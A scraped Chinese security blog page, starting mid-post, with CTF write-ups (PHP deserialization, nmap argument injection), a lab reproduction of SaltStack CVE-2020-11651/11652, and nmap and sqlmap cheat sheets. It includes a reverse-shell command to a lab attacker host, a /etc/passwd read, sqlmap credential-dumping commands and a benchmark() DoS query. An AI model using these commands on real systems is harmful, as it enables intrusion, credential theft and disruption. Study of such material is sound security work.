&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//class FileHandler &#123;</span></span><br><span class="line"><span class="comment">//    public $op=2;</span></span><br><span class="line"><span class="comment">//    public $filename="flag.php";</span></span><br><span class="line"><span class="comment">//    public $content;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//function is_valid($s) &#123;</span></span><br><span class="line"><span class="comment">//    for($i = 0; $i &lt; strlen($s); $i++)</span></span><br><span class="line"><span class="comment">//        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))</span></span><br><span class="line"><span class="comment">//            return false;</span></span><br><span class="line"><span class="comment">//    return true;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> FileHandler();</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">'-----------------\n'</span>);</span><br><span class="line">var_dump(is_valid($b));</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">'-----------------'</span>);</span><br><span class="line">print_r($b);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">'-----------------'</span>);</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://i.loli.net/2020/06/22/PubsAhSFknG5i8d.png" alt="image.png"></p>
-<p>最终payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dafbc9e0-7783-4a62-8b22-19897fa2da2e.node3.buuoj.cn/?str=O:11:%22FileHandler%22:3:&#123;s:2:%22op%22;i:2;s:8:%22filename%22;s:8:%22flag.php%22;s:7:%22content%22;N;&#125;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://i.loli.net/2020/06/22/YryEIFmBLlck91D.png" alt="image.png"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/06/20/网鼎杯-青龙组-web/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-网鼎杯-朱雀组-web" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/06/05/网鼎杯-朱雀组-web/">网鼎杯 朱雀组 web</a>
-    </h1>
-  
-
-        
-        <a href="/2020/06/05/网鼎杯-朱雀组-web/" class="archive-article-date">
-  	<time datetime="2020-06-05T08:10:23.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-05</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2><span id="1-phpweb">1. phpweb</span></h2><p><img src="https://i.loli.net/2020/06/05/A4GDcfg6mpPjre9.png" alt="image.png"></p>
-<p>抓包 </p>
-<p><img src="https://i.loli.net/2020/06/05/HYDQhNuWGspZg1U.png" alt="image.png"></p>
-<p>func=date&amp;p=Y-m-d+h%3Ai%3As+a<br>猜想用到了<br>call_user_func()</p>
-<p>尝试<br>func=file_get_contents&amp;p=index.php<br><img src="https://i.loli.net/2020/06/05/vBuhLC45zwO3mkK.png" alt="image.png"></p>
-<p>获取index.php源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> $disable_fun = <span class="keyword">array</span>(<span class="string">"exec"</span>,<span class="string">"shell_exec"</span>,<span class="string">"system"</span>,<span class="string">"passthru"</span>,<span class="string">"proc_open"</span>,<span class="string">"show_source"</span>,<span class="string">"phpinfo"</span>,<span class="string">"popen"</span>,<span class="string">"dl"</span>,<span class="string">"eval"</span>,<span class="string">"proc_terminate"</span>,<span class="string">"touch"</span>,<span class="string">"escapeshellcmd"</span>,<span class="string">"escapeshellarg"</span>,<span class="string">"assert"</span>,<span class="string">"substr_replace"</span>,<span class="string">"call_user_func_array"</span>,<span class="string">"call_user_func"</span>,<span class="string">"array_filter"</span>, <span class="string">"array_walk"</span>,  <span class="string">"array_map"</span>,<span class="string">"registregister_shutdown_function"</span>,<span class="string">"register_tick_function"</span>,<span class="string">"filter_var"</span>, <span class="string">"filter_var_array"</span>, <span class="string">"uasort"</span>, <span class="string">"uksort"</span>, <span class="string">"array_reduce"</span>,<span class="string">"array_walk"</span>, <span class="string">"array_walk_recursive"</span>,<span class="string">"pcntl_exec"</span>,<span class="string">"fopen"</span>,<span class="string">"fwrite"</span>,<span class="string">"file_put_contents"</span>);</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">gettime</span><span class="params">($func, $p)</span> </span>&#123;</span><br><span class="line">     $result = call_user_func($func, $p);</span><br><span class="line">     $a= gettype($result);</span><br><span class="line">     <span class="keyword">if</span> ($a == <span class="string">"string"</span>) &#123;</span><br><span class="line">         <span class="keyword">return</span> $result;</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">""</span>;&#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">     <span class="keyword">var</span> $p = <span class="string">"Y-m-d h:i:s a"</span>;</span><br><span class="line">     <span class="keyword">var</span> $func = <span class="string">"date"</span>;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">         <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">""</span>) &#123;</span><br><span class="line">             <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> $func = $_REQUEST[<span class="string">"func"</span>];</span><br><span class="line"> $p = $_REQUEST[<span class="string">"p"</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> ($func != <span class="keyword">null</span>) &#123;</span><br><span class="line">     $func = strtolower($func);</span><br><span class="line">     <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">         <span class="keyword">echo</span> gettime($func, $p);</span><br><span class="line">     &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">"Hacker..."</span>);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>使用黑名单禁用函数，system被禁用</p>
-<p>利用Test类进行反序列化绕过黑名单调用system</p>
-<p><img src="https://i.loli.net/2020/06/05/VUZIfCu1QMjy28c.png" alt="image.png"></p>
-<p><img src="https://i.loli.net/2020/06/05/HSwcGJelpNvjAf7.png" alt="image.png"></p>
-<p>用find / -name flag* 找<br><img src="https://i.loli.net/2020/06/05/LMAyWpQE3vD9roJ.png" alt="image.png"><br>在/tmp目录下</p>
-<p>cat /tmp/flagoefiu4r93<br>获得flag<br><img src="https://i.loli.net/2020/06/05/jaLlIVrJWfEvsoD.png" alt="image.png"></p>
-<h2><span id="2nmap">2.nmap</span></h2><p>题目<br><img src="https://i.loli.net/2020/06/05/fHSgPCtJ7iws6QI.png" alt="image.png"></p>
-<p>view-source 发现提示<br><code>&lt;!-- flag is in /flag --&gt;</code></p>
-<p><img src="https://i.loli.net/2020/06/05/kijh1wduBaDnQOF.png" alt="image.png"></p>
-<p>构造payload<br><code>127.0.0.1 &#39; -iL /flag -oN 111.txt &#39;</code></p>
-<ul>
-<li><p>-iL　　从inputfilename文件中读取扫描的目标。在这个文件中要有一个主机或者网络的列表，由空格键、制表键或者回车键作为分割符。如果使用-iL-，nmap就会从标准输入stdin读取主机名字。你可以从指定目标一节得到更加详细的信息</p>
-</li>
-<li><p>-oN 扫描结果重定向到一个可读的文件logfilename中。</p>
-</li>
-</ul>
-<p><img src="https://i.loli.net/2020/06/05/5y97HOuseDiB2Co.png" alt="image.png"><br>访问 111.txt 得到flag<br><img src="https://i.loli.net/2020/06/05/MBKeqxlEP9zfNbm.png" alt="image.png"></p>
-<h2><span id="3-think-java">3. Think Java</span></h2>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/06/05/网鼎杯-朱雀组-web/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-cve-2020-11651-SaltStack远程命令执行漏洞" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/05/13/cve-2020-11651-SaltStack远程命令执行漏洞/">cve-2020-11651  SaltStack远程命令执行漏洞</a>
-    </h1>
-  
-
-        
-        <a href="/2020/05/13/cve-2020-11651-SaltStack远程命令执行漏洞/" class="archive-article-date">
-  	<time datetime="2020-05-13T10:47:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-13</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><code>出自合天网安实验室</code></p>
-<h1><span id="漏洞信息">漏洞信息</span></h1><h2><span id="1-漏洞信息">1.   漏洞信息：</span></h2><p>2020年5月3日，阿里云应急响应中心监测到近日国外某安全团队披露了SaltStack存在认证绕过致命令执行漏洞以及目录遍历漏洞。</p>
-<p>CVE编号：CVE-2020-11651、CVE-2020-11652</p>
-<p>影响版本：SaltStack&lt; 2019.2.4、 SaltStack &lt;3000.2</p>
-<h2><span id="2-基本描述">2.  基本描述：</span></h2><p>SaltStack是基于Python开发的一套C/S架构配置管理工具，是一个服务器基础架构集中化管理平台，具备配置管理、远程执行、监控等功能，基于Python语言实现，结合轻量级消息队列（ZeroMQ）与Python第三方模块（Pyzmq、PyCrypto、Pyjinjia2、python-msgpack和PyYAML等）构建。</p>
-<p>Salt用于监视和更新服务器状态。每个服务器运行一个称为“ minion”的代理程序，该代理程序连接到“ master”主机，即salt安装程序，该安装程序从Minions收集状态报告并发布Minions可以对其执行操作的更新消息。通常，此类消息是对所选服务器配置的更新，但是它们也可以用于在多个（甚至所有）受管系统上并行并行运行同一命令。</p>
-<p>salt中的默认通信协议为ZeroMQ。主服务器公开两个ZeroMQ实例，一个称为“请求服务器”，其中 minion 可以连接到其中报告其状态（或命令输出），另一个称为”发布服务器”，其中主服务器可以连接和订阅这些消息</p>
-<h2><span id="3-漏洞细节">3.  漏洞细节：</span></h2><p>身份验证绕过漏洞（CVE-2020-11651）</p>
-<p>ClearFuncs 类在处理授权时，并未限制 _send_pub() 方法，该方法直接可以在发布队列消息，发布的消息会通过 root 身份权限进行执行命令。ClearFuncs 还公开了 _prep_auth_info() 方法，通过该方法可以获取到”root key”，通过获取到的”root key”可以在主服务上远程调用命令。</p>
-<p>目录遍历漏洞（CVE-2020-11652）</p>
-<p>whell 模块中包含用于在特定目录下读取、写入文件命令。函数中输入的信息与目录进行拼接可以绕过目录限制。</p>
-<p>在salt.tokens.localfs 类中的 get_token() 方法（由 ClearFuncs 类可以通过未授权进行调用）无法删除输入的参数，并且作为文件名称使用，在路径中通过拼接”..”进行读取目标目录之外的文件。唯一的限制是文件必须通过 salt.payload.Serial.loads() 进行反序列化。</p>
-<h2><span id="4-漏洞修复">4.   漏洞修复</span></h2><ol>
-<li><p>将SaltStack升级至安全版本以上，升级前建议做好快照备份。</p>
-</li>
-<li><p>设置SaltStack为自动更新，及时获取相应补丁。</p>
-</li>
-<li><p>将Salt Master默认监听端口（默认4505 和 4506）设置为禁止对公网开放，或仅对可信对象开放。</p>
-</li>
-</ol>
-<h2><span id="漏洞利用">漏洞利用</span></h2><p>靶机：Centos7   IP地址：10.1.1.137</p>
-<p>攻击机：Kali+python3  IP地址：10.1.1.135</p>
-<h2><span id="1-使用nmap探测端口是否开放">1. 使用nmap探测端口是否开放</span></h2><p>因为该应用默认绑定的端口为4505、4506，所以我们可以针对这两个端口进行扫描，如果扫描到这两个端口，则可以进行漏洞检测</p>
-<p>nmap -p 4505,4506 10.1.1.137</p>
-<p><img src="https://i.loli.net/2020/05/13/KqWMcbmOoIepJwA.jpg" alt="1.jpg"></p>
-<p>可以看到目标主机开放了4505、4506两个端口，根据预备知识里的基本描述我们还可以知道salt中的默认通信协议为ZeroMQ，所以可以对开放的端口进行服务探测，</p>
-<p>nmap -sV -p4505,4506 10.1.1.137</p>
-<p><img src="https://i.loli.net/2020/05/13/x1OczdK9iDI4At2.jpg" alt="2.jpg"></p>
-<h2><span id="任务描述对开放的端口检测漏洞是否存在">任务描述：对开放的端口检测漏洞是否存在</span></h2><p>在前面我们探测到目标机器上开了4505、4506这两个端口，那么我们就可以对这两个端口进行漏洞检测（需要pip install salt==3000.1，实验机已下载）</p>
-<p>下载所需脚本：wget <a href="http://tools.hetianlab.com/tools/CVE-2020-11651.zip" target="_blank" rel="noopener">http://tools.hetianlab.com/tools/CVE-2020-11651.zip</a></p>
-<p>使用unzip对脚本进行解压</p>
-<p><img src="https://i.loli.net/2020/05/13/o892jshtAHdekKn.jpg" alt="3.jpg"></p>
-<p>读取“root key”检测是否存在漏洞（在实验过程中可能会遇到“OFFLINE”不在线的情况，这是因为服务没有完全启动，多尝试几次或者等一会再试就可以了）</p>
-<p>python3 exploit.py –master 10.1.1.137</p>
-<p><img src="https://i.loli.net/2020/05/13/uQaDZVgnt6Bzfxi.jpg" alt="4.jpg"></p>
-<p>成功读取到了“root key”，说明存在漏洞。</p>
-<h2><span id="3-任务描述漏洞利用利用该漏洞进行目录遍历-执行命令">3 任务描述：漏洞利用，利用该漏洞进行目录遍历、执行命令</span></h2><p>该步骤我们可以分为两步进行利用</p>
-<p>在CVE-2020-11652目录遍历漏洞中，攻击者通过构造恶意请求，读取服务器上任意文件。比如读取/etc/passwd</p>
-<p>python3 exploit.py –master 10.1.1.137 -r /etc/passwd</p>
-<p><img src="https://i.loli.net/2020/05/13/AsYgLlvwq1oeuHf.jpg" alt="5.jpg"></p>
-<p>在CVE-2020-11651认证绕过漏洞中，攻击者通过构造恶意请求，可以绕过Salt Master的验证逻辑，调用相关未授权函数功能，从而可以造成远程命令执行漏洞。</p>
-<p>比如反弹一个shell回来</p>
-<p>首先在kali上监听一个端口</p>
-<p>nc -lvvp 1234</p>
-<p>然后执行脚本</p>
-<p>python3 exploit.py –master 10.1.1.137 –exec ‘bash -i &gt;&amp; /dev/tcp/10.1.1.135/1234 0&gt;&amp;1’</p>
-<p><img src="https://i.loli.net/2020/05/13/5yisEvJDM7panw2.jpg" alt="6.jpg"></p>
-<p>在nc监听的窗口可以看到获取到了一个shell</p>
-<p><img src="https://i.loli.net/2020/05/13/32utTXB5FygRmNI.jpg" alt="8.jpg"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/05/13/cve-2020-11651-SaltStack远程命令执行漏洞/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-nmap" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/04/29/nmap/">nmap </a>
-    </h1>
-  
-
-        
-        <a href="/2020/04/29/nmap/" class="archive-article-date">
-  	<time datetime="2020-04-29T10:43:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-29</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>基本语法<br>nmap [扫描方式] [命令选项] {目标}</p>
-<ol>
-<li>设置扫描端口<br>无端口范围时扫描1000 个常用端口</li>
-</ol>
-<p>-F 扫描100个最常用端口<br>-p<port1>-<port2>   指定端口<br>范围<br>-p<port1>,<port2>,…. 端口列表</port2></port1></port2></port1></p>
-<p>-pU:53,U:110,T20-445  TCP&amp;UDP结合</p>
-<p>-r   线性扫描（不是随机扫描）</p>
-<p>–top-ports <n>   扫描n个最常用端口</n></p>
-<p>-p-65535    忽略初始端口，nmap从端口1开始扫描</p>
-<p>忽略结束端口，nmap扫描至65535端口</p>
-<p>-p-         扫描0-65535端口</p>
-<p>实验：<br>Nmap -F 192.168.1.1</p>
-<p>nmap -p 0-81 192.168.1.1</p>
-<p>nmap -p- 192.168.1.1</p>
-<ol start="2">
-<li>深入扫描命令</li>
-</ol>
-<p>-Pn  不探测扫描（假定所有主机都存活）</p>
-<p>-PB  默认探测扫描（探测端口：TCP 80，445&amp;ICMP）</p>
-<p>-PS<portlist>  tcp探测扫描</portlist></p>
-<p>-PE  ICMP Echo Request</p>
-<p>-PP  ICMP Timestamp Request</p>
-<p>-PM  ICMP Netmask Request</p>
-<p>nmap -Pn 192.168.1.1</p>
-<p>nmap -PB 192.168.1.1</p>
-<ol start="3">
-<li>扫描类型</li>
-</ol>
-<p>-sP  只探测主机在线情况</p>
-<p>-sS  SYN扫描（隐身扫描）</p>
-<p>-ST  TCP扫描</p>
-<p>-sU  UDP扫描</p>
-<p>-sV  系统版本检测</p>
-<p>-O   操作系统识别</p>
-<p>–scanflags  指定TCP标识位（设置URG, ACK, PSH,RST,SYN,FIN位）</p>
-<p>nmap -sP 192.168.1.1/24</p>
-<p>nmap -sS 192.168.1.1/24</p>
-<p>nmap -sT 192.168.1.1/24</p>
-<p>nmap -sU -F 192.168.1.1</p>
-<p>nmap -sV 192.168.1.1</p>
-<p>nmap -O 192.168.1.1</p>
-<ol start="4">
-<li>细粒度的时间选项<br>–min-hostgroup/max-hostgroup <size>  平行的主机扫描组的大小</size></li>
-</ol>
-<p>–min-parallelism/max-parallelism <numprobes>  并行探测</numprobes></p>
-<p>–min-rtt-timeout/max-rtttimeout/initial-rtt-timeout <time>   指定每轮探测的时间</time></p>
-<p>–max-retries <tries>    扫描探测的上限次数设定</tries></p>
-<p>–host-timeout <time>    设置timeout时间</time></p>
-<p>–scan-delay/–max-scan-delay <time>  调整两次探测之间的延迟</time></p>
-<p>–min-rate <number>     每秒发送数据包不少于<number>次</number></number></p>
-<p>nmap -host-timeout 10  192.168.1.1/24</p>
-<p>nmap -min-rate 100  192.168.1.1/24</p>
-<ol start="5">
-<li>时序选项</li>
-</ol>
-<p>-T0  偏执的：非常非常慢，用于IDS逃逸</p>
-<p>-T1  猥琐的：相当慢，用于IDS逃逸</p>
-<p>-T2  有礼貌的：降低速度以消耗更小的带宽，比默认慢十倍</p>
-<p>-T3  普通的：默认，根据目标的反应自动调整时间模式</p>
-<p>-T4  野蛮的：假定处在一个很好的网络环境，请求可能会淹没目标</p>
-<p>-T5  疯狂的：非常野蛮，很可能会淹没目标端口或是漏掉一些开放端口</p>
-<p>nmap -F -T2 192.168.1.1/24</p>
-<p>nmap -F -T3 192.168.1.1/24</p>
-<p>nmap -F -T4 192.168.1.1/24</p>
-<p>nmap -F -T5 192.168.1.1/24</p>
-<ol start="6">
-<li>输出格式</li>
-</ol>
-<p>-oN  标准输出</p>
-<p>-oG  好理解的格式</p>
-<p>-ox  xml格式</p>
-<p>-oA<basename>  用<basename>生成以上格式的文件 </basename></basename></p>
-<p>nmap -F -oG output1.txt  192.168.1.1</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">工具</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">nmap</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/04/29/nmap/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-sqlmap" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/04/26/sqlmap/">sqlmap</a>
-    </h1>
-  
-
-        
-        <a href="/2020/04/26/sqlmap/" class="archive-article-date">
-  	<time datetime="2020-04-26T11:53:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-26</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>[toc]</p>
-<h1><span id="1-sqlmap用于access数据库注入">1. sqlmap用于Access数据库注入</span></h1><h2><span id="猜解能否注入">猜解能否注入</span></h2><p><code>win:python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</code></p>
-<p><code>linux:sqlmap -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</code>  </p>
-<p>（后面只写linux了）</p>
-<h2><span id="猜解表">猜解表</span></h2><p><code>sqlmap  -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --tables</code></p>
-<h2><span id="根据根据猜解的表进行猜解表的字段假如通过2得到了admin这个表">根据根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表)</span></h2><p><code>sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --columns -T admin</code></p>
-<h2><span id="根据字段猜解内容假如通过3得到字段为username和password">根据字段猜解内容(假如通过3得到字段为username和password)</span></h2><p><code>sqlmap -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --dump -T admin -C &quot;username,password&quot;</code></p>
-<h1><span id="sqlmap-cookie注入">sqlmap cookie注入</span></h1><h2><span id="cookie注入猜解表">cookie注入，猜解表</span></h2><p><code>-u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --table --level 2</code></p>
-<h2><span id="猜解字段通过1的表猜解字段假如表为admin">猜解字段，(通过1的表猜解字段，假如表为admin)</span></h2><p><code>sqlmap -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --columns -T
-admin --level 2</code></p>
-<h2><span id="猜解内容">猜解内容</span></h2><p><code>sqlmap -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --dump -T
-admin -C &quot;username,password&quot; --level 2</code></p>
-<h1><span id="sqlmap用于mysql中ddos攻击">SQLMAP用于mysql中DDOS攻击</span></h1><h2><span id="获取一个shell">获取一个Shell</span></h2><p><code>sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --sql-shell</code></p>
-<h2><span id="输入执行语句完成ddos攻击">输入执行语句完成DDOS攻击</span></h2><p><code>select benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f)</code></p>
-<h1><span id="sqlmap-mysql注入">sqlmap mysql注入</span></h1><h2><span id="数据库名">数据库名</span></h2><p><code>sqlmap -u &quot;http://www.xxx.com/link.php?id=321&quot; --dbs</code></p>
-<h2><span id="通过第一步的数据库查找表假如数据库名为dataname">通过第一步的数据库查找表(假如数据库名为dataname)</span></h2><p>sqlmap -u “<a href="http://www.xxx.com/link.php?id=321&quot;" target="_blank" rel="noopener">http://www.xxx.com/link.php?id=321&quot;</a> -D dataname –tablest</p>
-<h2><span id="通过2中的表得出列名假如表为table_name">通过2中的表得出列名(假如表为table_name)</span></h2><p><code>sqlmap -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname -T table_name --columns</code></p>
-<h2><span id="获取字段的值假如扫描出iduserpassword字段">获取字段的值(假如扫描出id,user,password字段)</span></h2><p><code>sqlmap -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname -T table_name -C</code></p>
-<h1><span id="sqlmap-post注入">sqlmap post注入</span></h1><p>使用burpsuit抓包 获取post请求信息<br>Copy to file<br>命名为test.txt 放到sqlmap目录下</p>
-<p><code>sqlmap -r test.txt -p tfUPass</code></p>
-<p>-r sqlmap加载post请求的rsearch-test.txt</p>
-<p>-p 指定注入用的参数。</p>
-<h2><span id="自动的搜索">自动的搜索</span></h2><p><code>sqlmap -u &quot;http://testasp.vulnweb.com/Login.asp&quot;--forms</code></p>
-<h2><span id="指定参数搜索">指定参数搜索</span></h2><p><code>sqlmap -u &quot;http://testasp.vulnweb.com/Login.asp&quot;--data &quot;tfUName=321&amp;tfUPass=321&quot;</code></p>
-<h1><span id="google搜索注入">Google搜索注入</span></h1><p>inurl后面的语言是由自己定的<br><code>sqlmap -g inurl:php?id=</code></p>
-<h1><span id="sqlmap中的请求延迟">SQLMAP中的请求延迟</span></h1><p><code>sqlmap --dbs -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --delay 1</code></p>
-<p><code>sqlmap --dbs -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --safe-freq 3</code></p>
-<h1><span id="sqlmap-绕过waf防火墙">sqlmap 绕过WAF防火墙</span></h1><p>注入点:<a href="http://192.168.159.1/news.php?id=1" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1</a></p>
